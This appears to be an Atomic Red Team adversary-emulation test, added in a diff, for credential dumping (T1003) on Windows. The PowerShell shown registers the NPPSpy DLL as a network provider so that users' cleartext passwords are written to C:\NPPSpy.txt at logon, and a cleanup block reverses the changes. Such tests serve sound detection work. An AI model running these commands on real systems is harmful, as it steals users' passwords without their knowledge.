@@ -1,0 +1,32 @@
+attack_technique: T1003
+display_name: OS Credential Dumping
+atomic_tests:
+- name: Credential Dumping with NPPSpy
+  description: |-
+    Changes ProviderOrder Registry Key Parameter and creates Key for NPPSpy.
+    After user's logging in cleartext password is saved in C:\NPPSpy.txt.
+    Clean up deletes the files and reverses Registry changes.
+    NPPSpy Source: https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      Copy-Item "C:\AtomicRedTeam\atomic-red-team\atomics\T1003.004\NPPSPY.dll" -Destination "C:\Windows\System32"
+      $path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
+      $UpdatedValue = $Path.PROVIDERORDER + ",NPPSpy"
+      Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value $UpdatedValue
+      New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy
+      New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider
+      New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Class" -Value 2
+      New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Name" -Value NPPSpy
+      New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "ProviderPath" -PropertyType ExpandString -Value "%SystemRoot%\System32\NPPSPY.dll"
+      echo "[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt"
+    cleanup_command: |-
+      $cleanupPath = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
+      $cleanupUpdatedValue = $cleanupPath.PROVIDERORDER
+      $cleanupUpdatedValue = $cleanupUpdatedValue -replace ".{7}$" #drop last 7 chars - 2x NPPSpy and 2x ,
+      Set-ItemProperty -Path $cleanupPath.PSPath -Name "PROVIDERORDER" -Value $cleanupUpdatedValue
+      Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy" -Recurse -ErrorAction Ignore
+      Remove-Item C:\NPPSpy.txt -ErrorAction Ignore
+    name: powershell
+  
